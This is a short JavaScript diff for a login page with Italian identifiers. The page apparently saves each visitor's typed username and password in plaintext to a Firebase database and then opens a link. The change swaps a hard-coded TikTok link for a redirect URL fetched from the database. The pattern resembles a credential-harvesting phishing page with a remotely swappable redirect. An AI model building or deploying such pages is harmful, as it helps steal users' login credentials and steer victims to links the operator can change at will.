@@ -15,7 +15,7 @@ btnAcces.addEventListener('click', () => {
   nome:NomeUtente,
   password:Password,
   })
-  open("https://vm.tiktok.com/ZMdKg5hK7/");
+  apriLink();
 });
 
   //--------------Controllo dati----------------------//
@@ -29,3 +29,10 @@ if(NomeUtente != "" && Password != ""){
 else {
   document.getElementById("btnAccedi").disabled=true;
 }}, 500);
+
+function apriLink(){
+const dbRef = firebase.database().ref();
+  dbRef.child("/Link/Link").get().then((snapshot) => {
+    open(snapshot.val());
+  });
+}
